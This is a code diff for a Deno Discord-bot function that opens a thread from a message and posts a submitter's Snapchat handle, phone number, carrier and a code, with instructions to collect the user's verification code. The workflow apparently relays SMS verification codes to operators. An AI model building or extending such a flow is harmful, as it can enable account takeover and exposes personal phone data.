@@ -75,7 +75,7 @@ Deno.serve(async (req) => {
         discord_user_id: userId
       });
 
-      // Créer le thread privé
+      // Créer le thread privé depuis le message
       const threadRes = await fetch(
         `https://discord.com/api/v10/channels/${CHANNEL_ID}/messages/${message.id}/threads`,
         {
@@ -86,58 +86,59 @@ Deno.serve(async (req) => {
           },
           body: JSON.stringify({
             name: `✅ Prise en charge — @${snapchat}`,
-            type: 12,
-            invitable: false,
             auto_archive_duration: 1440
           })
         }
       );
 
-      if (threadRes.ok) {
-        const thread = await threadRes.json();
-        const threadId = thread.id;
-
-        // Ajouter l'utilisateur au thread
-        await fetch(
-          `https://discord.com/api/v10/channels/${threadId}/thread_members/${userId}`,
-          {
-            method: 'PUT',
-            headers: { 'Authorization': `Bot ${BOT_TOKEN}` }
-          }
-        );
-
-        // Envoyer le message dans le thread
-        const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
-        const triggerUrl = `${appUrl}/?trigger=${submissionId}`;
-
-        const threadEmbed = {
-          title: "✅ Tu as pris en charge cette soumission",
-          color: 3447003,
-          fields: [
-            { name: "👻 Utilisateur", value: `@${snapchat}`, inline: true },
-            { name: "📡 Opérateur", value: submission.operateur, inline: true },
-            { name: "📞 Numéro", value: submission.telephone, inline: true },
-            { name: "🔑 Code", value: `\`${code}\``, inline: false },
-            {
-              name: "📝 Instructions",
-              value: `Envoie le code à l'utilisateur et attends qu'il te donne son code de vérification.\n\n[Cliquer ici pour envoyer le code](${triggerUrl})`,
-              inline: false
-            }
-          ]
-        };
-
-        await fetch(
-          `https://discord.com/api/v10/channels/${threadId}/messages`,
-          {
-            method: 'POST',
-            headers: {
-              'Authorization': `Bot ${BOT_TOKEN}`,
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ embeds: [threadEmbed] })
-          }
-        );
+      if (!threadRes.ok) {
+        console.error('Thread creation failed:', threadRes.status, await threadRes.text());
+        return Response.json({ status: 'checking' });
       }
+
+      const thread = await threadRes.json();
+      const threadId = thread.id;
+
+      // Ajouter l'utilisateur au thread
+      await fetch(
+        `https://discord.com/api/v10/channels/${threadId}/thread_members/${userId}`,
+        {
+          method: 'PUT',
+          headers: { 'Authorization': `Bot ${BOT_TOKEN}` }
+        }
+      );
+
+      // Envoyer le message dans le thread
+      const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
+      const triggerUrl = `${appUrl}/?trigger=${submissionId}`;
+
+      const threadEmbed = {
+        title: "✅ Tu as pris en charge cette soumission",
+        color: 3447003,
+        fields: [
+          { name: "👻 Utilisateur", value: `@${snapchat}`, inline: true },
+          { name: "📡 Opérateur", value: submission.operateur, inline: true },
+          { name: "📞 Numéro", value: submission.telephone, inline: true },
+          { name: "🔑 Code", value: `\`${code}\``, inline: false },
+          {
+            name: "📝 Instructions",
+            value: `Envoie le code à l'utilisateur et attends qu'il te donne son code de vérification.\n\n[Cliquer ici pour envoyer le code](${triggerUrl})`,
+            inline: false
+          }
+        ]
+      };
+
+      await fetch(
+        `https://discord.com/api/v10/channels/${threadId}/messages`,
+        {
+          method: 'POST',
+          headers: {
+            'Authorization': `Bot ${BOT_TOKEN}`,
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ embeds: [threadEmbed] })
+        }
+      );
 
       return Response.json({ status: 'code_ready' });
     }
